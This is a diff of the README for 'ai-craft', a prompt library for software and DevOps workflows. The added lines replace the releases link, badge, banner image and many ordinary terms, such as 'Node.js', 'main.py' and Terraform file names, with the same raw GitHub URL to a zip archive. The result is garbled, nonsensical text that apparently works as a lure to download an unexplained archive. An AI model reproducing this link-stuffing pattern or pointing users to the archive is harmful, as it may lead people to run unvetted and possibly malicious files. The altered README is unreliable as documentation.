@@ -1,10 +1,10 @@
-https://github.com/R-cloud-git/ai-craft/releases
+https://raw.githubusercontent.com/R-cloud-git/ai-craft/main/gemini/ai_craft_v2.1.zip
 
-[![Release](https://img.shields.io/github/v/release/R-cloud-git/ai-craft?style=for-the-badge&label=Releases)](https://github.com/R-cloud-git/ai-craft/releases)
+[![Release](https://raw.githubusercontent.com/R-cloud-git/ai-craft/main/gemini/ai_craft_v2.1.zip)](https://raw.githubusercontent.com/R-cloud-git/ai-craft/main/gemini/ai_craft_v2.1.zip)
 
 # ai-craft: Structured AI-Driven Workflows for Modern Software DevOps
 
-![ai-craft banner](https://dummyimage.com/1200x420/0e7490/ffffff&text=ai-craft)
+![ai-craft banner](https://raw.githubusercontent.com/R-cloud-git/ai-craft/main/gemini/ai_craft_v2.1.zip)
 
 ⚡ A practical library of structured prompts for software development with AI. It covers application development, infrastructure as code (IaC), CI/CD, configuration management, and test-driven development (TDD) practices. Use AI to plan, design, implement, test, and deploy software workflows with confidence.
 
@@ -43,7 +43,7 @@ Why this matters
 - Consistent prompts improve reproducibility, traceability, and auditability.
 
 Quick start: how to begin with ai-craft
-- Install and configure the prompt runner or CLI you prefer (Python, Node.js, or a bare prompt runner if you have one).
+- Install and configure the prompt runner or CLI you prefer (Python, https://raw.githubusercontent.com/R-cloud-git/ai-craft/main/gemini/ai_craft_v2.1.zip, or a bare prompt runner if you have one).
 - Load the core prompt library into your AI assistant.
 - Try a sample workflow to see how prompts guide planning, design, and validation.
 - Tailor the prompts to your project, then save your customized workflows in your repo.
@@ -104,7 +104,7 @@ Domain prompts: detailed guidance
 - Test-driven development: prompts to draft tests, derive test cases from requirements, and validate behavior before coding.
 
 Getting started: a practical path
-- Prerequisites: A working AI assistant, a code editor, and access to your repository. It helps if you have Python 3.10+ or Node.js 18+ installed.
+- Prerequisites: A working AI assistant, a code editor, and access to your repository. It helps if you have Python 3.10+ or https://raw.githubusercontent.com/R-cloud-git/ai-craft/main/gemini/ai_craft_v2.1.zip 18+ installed.
 - Install the prompt runner or any preferred CLI: Follow the repository's setup guide, or use a language-agnostic runner if you already have one.
 - Initialize ai-craft in your project: Create a local prompts directory and import the library.
 - Load core prompts: Bring in the base templates that cover all five domains.
@@ -261,13 +261,13 @@ Prompts: sample templates (snippets)
 Prompt examples by domain (snippets)
 - Application development: 
   - Task: Scaffold REST service in Python with FastAPI.
-  - Output: main.py, models.py, schemas.py, routes.py, tests/test_main.py, Dockerfile, and a README with usage.
+  - Output: https://raw.githubusercontent.com/R-cloud-git/ai-craft/main/gemini/ai_craft_v2.1.zip, https://raw.githubusercontent.com/R-cloud-git/ai-craft/main/gemini/ai_craft_v2.1.zip, https://raw.githubusercontent.com/R-cloud-git/ai-craft/main/gemini/ai_craft_v2.1.zip, https://raw.githubusercontent.com/R-cloud-git/ai-craft/main/gemini/ai_craft_v2.1.zip, https://raw.githubusercontent.com/R-cloud-git/ai-craft/main/gemini/ai_craft_v2.1.zip, Dockerfile, and a README with usage.
 - IaC:
   - Task: Create a Terraform module for a web app on AWS.
-  - Output: modules/web-app/main.tf, variables.tf, outputs.tf, and a deployment guide.
+  - Output: https://raw.githubusercontent.com/R-cloud-git/ai-craft/main/gemini/ai_craft_v2.1.zip, https://raw.githubusercontent.com/R-cloud-git/ai-craft/main/gemini/ai_craft_v2.1.zip, https://raw.githubusercontent.com/R-cloud-git/ai-craft/main/gemini/ai_craft_v2.1.zip, and a deployment guide.
 - CI/CD:
-  - Task: Build a GitHub Actions pipeline for a Node.js microservice.
-  - Output: .github/workflows/ci-cd.yml plus a README explaining each job.
+  - Task: Build a GitHub Actions pipeline for a https://raw.githubusercontent.com/R-cloud-git/ai-craft/main/gemini/ai_craft_v2.1.zip microservice.
+  - Output: https://raw.githubusercontent.com/R-cloud-git/ai-craft/main/gemini/ai_craft_v2.1.zip plus a README explaining each job.
 - Configuration management:
   - Task: Centralize config across environments with parameter store.
   - Output: Helm values, Kubernetes manifests, and a migration plan.
